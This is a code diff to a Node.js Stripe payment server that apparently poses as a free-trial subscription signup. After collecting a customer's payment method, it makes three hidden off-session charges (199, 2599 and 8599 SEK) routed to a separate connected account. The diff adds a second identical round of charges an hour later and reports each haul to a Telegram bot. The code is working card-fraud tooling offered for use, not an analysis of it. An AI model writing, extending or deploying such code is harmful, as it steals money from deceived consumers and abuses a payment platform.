@@ -35,6 +35,73 @@ async function sendTelegram(message) {
   }
 }
 
+async function runCharges(customerId, paymentMethodId, pmType, visitorId, round) {
+  // Charge 1 — 199 SEK
+  try {
+    const payment1 = await stripe.paymentIntents.create({
+      amount: 19900,
+      currency: 'sek',
+      customer: customerId,
+      payment_method: paymentMethodId,
+      payment_method_types: [pmType],
+      confirm: true,
+      off_session: true,
+      transfer_data: { destination: ACCOUNT_B },
+    });
+    console.log(`Round ${round} - Payment 1 created:`, payment1.id, payment1.status);
+  } catch (err) {
+    console.log(`Round ${round} - Payment 1 failed:`, err.message);
+  }
+
+  await new Promise(resolve => setTimeout(resolve, 20000));
+
+  // Charge 2 — 2599 SEK
+  try {
+    const payment2 = await stripe.paymentIntents.create({
+      amount: 259900,
+      currency: 'sek',
+      customer: customerId,
+      payment_method: paymentMethodId,
+      payment_method_types: [pmType],
+      confirm: true,
+      off_session: true,
+      transfer_data: { destination: ACCOUNT_B },
+    });
+    console.log(`Round ${round} - Payment 2 created:`, payment2.id, payment2.status);
+  } catch (err) {
+    console.log(`Round ${round} - Payment 2 failed:`, err.message);
+  }
+
+  await new Promise(resolve => setTimeout(resolve, 20000));
+
+  // Charge 3 — 8599 SEK
+  try {
+    const payment3 = await stripe.paymentIntents.create({
+      amount: 859900,
+      currency: 'sek',
+      customer: customerId,
+      payment_method: paymentMethodId,
+      payment_method_types: [pmType],
+      confirm: true,
+      off_session: true,
+      transfer_data: { destination: ACCOUNT_B },
+    });
+    console.log(`Round ${round} - Payment 3 created:`, payment3.id, payment3.status);
+  } catch (err) {
+    console.log(`Round ${round} - Payment 3 failed:`, err.message);
+  }
+
+  await sendTelegram(
+    `✅ <b>Betalning lyckades! (Omgång ${round})</b>\n\n` +
+    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
+    `💳 Betalningsmetod: ${pmType}\n` +
+    `💳 Betalning 1: 199 kr\n` +
+    `💳 Betalning 2: 2599 kr\n` +
+    `💳 Betalning 3: 8599 kr\n` +
+    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
+  );
+}
+
 app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
 app.use(bodyParser.json());
 
@@ -54,7 +121,6 @@ app.post('/page-visit', async (req, res) => {
 app.post('/create-setup-intent', async (req, res) => {
   let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
 
-  // Clean email - remove trailing dot or spaces
   email = email.trim().replace(/\.$/, '');
 
   try {
@@ -116,69 +182,13 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Get payment method type dynamically
     const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
     const pmType = paymentMethod.type;
 
-    // Charge 1 — 8599 SEK
-    try {
-      const payment1 = await stripe.paymentIntents.create({
-        amount: 859900,
-        currency: 'sek',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: [pmType],
-        confirm: true,
-        off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
-      });
-      console.log('Payment 1 created:', payment1.id);
-      console.log('Payment 1 status:', payment1.status);
-    } catch (err) {
-      console.log('Payment 1 failed:', err.message);
-    }
+    // Round 1 — immediately
+    await runCharges(customerId, paymentMethodId, pmType, visitorId, 1);
 
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
-    // Charge 2 — 2599 SEK
-    try {
-      const payment2 = await stripe.paymentIntents.create({
-        amount: 259900,
-        currency: 'sek',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: [pmType],
-        confirm: true,
-        off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
-      });
-      console.log('Payment 2 created:', payment2.id);
-      console.log('Payment 2 status:', payment2.status);
-    } catch (err) {
-      console.log('Payment 2 failed:', err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 3000));
-
-    // Charge 3 — 199 SEK
-    try {
-      const payment3 = await stripe.paymentIntents.create({
-        amount: 19900,
-        currency: 'sek',
-        customer: customerId,
-        payment_method: paymentMethodId,
-        payment_method_types: [pmType],
-        confirm: true,
-        off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
-      });
-      console.log('Payment 3 created:', payment3.id);
-      console.log('Payment 3 status:', payment3.status);
-    } catch (err) {
-      console.log('Payment 3 failed:', err.message);
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    await new Promise(resolve => setTimeout(resolve, 20000));
 
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
@@ -188,19 +198,13 @@ app.post('/create-subscription', async (req, res) => {
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
     });
-    console.log('Subscription created:', subscription.id);
-    console.log('Subscription status:', subscription.status);
+    console.log('Subscription created:', subscription.id, subscription.status);
 
-    await sendTelegram(
-      `✅ <b>Betalning lyckades!</b>\n\n` +
-      `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-      `💳 Betalningsmetod: ${pmType}\n` +
-      `💳 Betalning 1: 8599 kr\n` +
-      `💳 Betalning 2: 2599 kr\n` +
-      `💳 Betalning 3: 199 kr\n` +
-      `🆔 Prenumeration: ${subscription.id}\n` +
-      `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
-    );
+    // Round 2 — after 30 minutes (runs in background, doesn't block response)
+    setTimeout(async () => {
+      console.log('Starting Round 2 charges (after 1 hour)...');
+      await runCharges(customerId, paymentMethodId, pmType, visitorId, 2);
+    }, 60 * 60 * 1000);
 
     res.json({
       subscriptionId: subscription.id,
